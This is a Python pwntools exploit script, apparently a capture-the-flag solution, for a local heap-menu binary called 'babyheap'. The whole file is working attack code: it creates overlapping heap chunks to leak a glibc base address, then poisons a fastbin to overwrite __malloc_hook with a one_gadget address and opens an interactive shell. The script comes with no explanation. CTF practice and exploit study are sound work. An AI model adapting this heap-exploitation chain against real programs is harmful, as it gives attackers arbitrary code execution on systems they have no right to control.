from pwn import *

r = process("./babyheap",env={'LD_PRELOAD':'libc.so.6'})
e=ELF('./libc.so.6')

def sa(s,p):
    return r.sendlineafter(s,p)

def p():
    raw_input()

def add(size,content):
    sa("choice: ","1")
    sa("please input chunk size: ",str(size))
    sa("input chunk content: ",content)

def show(index):
    sa("choice: ","2")
    sa("please input chunk index: ",str(index))

def free(index):
    sa("choice: ","3")
    sa("please input chunk index: ",str(index))

def exp():
    add(0x18,"0")
    add(0x100,("aaaaaaaa"*2 * 0xf) + p64(0x100) + "aaaaaaaa")
    add(0x100,"2")
    add(0x100,"3")

    free(0)
    free(1)
    add(0x18,"a"*0x18)
    add(0x80,"flag")
    add(0x60,"123123")
    free(1)
    free(2)
    add(0x80,"")
    show(4)
    r.recvuntil("content: ")
    base = u64(r.recv(6) + '\x00\x00') - 0x3C4B78 
    print "%x "%base
    print "%x "%(base + 0x3C4B78 - 88 -0x30)
    free(1)
    payload = (p64(0) + p64(0)) * 8
    payload += p64(0) + p64(0x71)
    payload += (p64(0) + p64(0))*6
    payload += p64(0x70) + p64(0x111)
    add(0x100,payload)
    free(4)
    free(1)

    payload = (p64(0) + p64(0)) * 8
    payload += p64(0) + p64(0x71)
    payload += p64(base+e.symbols['__malloc_hook']-0x23) + p64(0)
    payload += p64(0)*2 * 5
    payload += p64(0x70) + p64(0x111)
    add(0x100,payload)
    
    add(0x60,"rjust")
    payload = "aaa" +p64(base+0xf1147)*2 +p64(base + 0x846D0)
    add(0x60,payload)
    r.interactive()

if __name__ == "__main__":
    exp()